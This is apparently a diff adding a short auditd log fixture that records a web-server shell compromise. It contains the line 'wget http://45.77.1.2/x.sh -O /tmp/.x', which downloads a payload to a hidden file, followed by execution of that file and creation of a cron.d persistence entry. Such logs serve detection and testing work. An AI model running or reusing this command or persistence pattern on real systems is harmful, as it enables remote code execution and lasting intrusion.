@@ -1,0 +1,7 @@
+type=SYSCALL msg=audit(1783142470.100:420): arch=c000003e syscall=59 success=yes exit=0 a0=55b a1=7ff a2=7ff a3=8 items=2 ppid=2222 pid=3333 auid=1001 uid=33 gid=33 euid=33 suid=33 fsuid=33 comm="sh" exe="/usr/bin/dash" key="aegis-exec"
+type=EXECVE msg=audit(1783142470.100:420): argc=4 a0="/bin/sh" a1="-c" a2="wget http://45.77.1.2/x.sh -O /tmp/.x"
+type=CWD msg=audit(1783142470.100:420): cwd="/var/www/html"
+type=PATH msg=audit(1783142470.100:420): item=0 name="/bin/sh" inode=123 dev=08:01 mode=0100755 ouid=0 ogid=0 nametype=NORMAL
+type=PATH msg=audit(1783142470.100:420): item=1 name="/tmp/.x" inode=999 dev=08:01 mode=0100755 ouid=33 ogid=33 nametype=CREATE
+type=SYSCALL msg=audit(1783142475.200:421): arch=c000003e syscall=2 success=yes exit=3 a0=55b a1=41 a2=1ed a3=0 items=1 ppid=3335 pid=3335 auid=1001 uid=33 gid=33 euid=33 suid=33 fsuid=33 comm="sh" exe="/tmp/.x" key="aegis-persist"
+type=PATH msg=audit(1783142475.200:421): item=0 name="/etc/cron.d/aegis-test" inode=1000 dev=08:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE
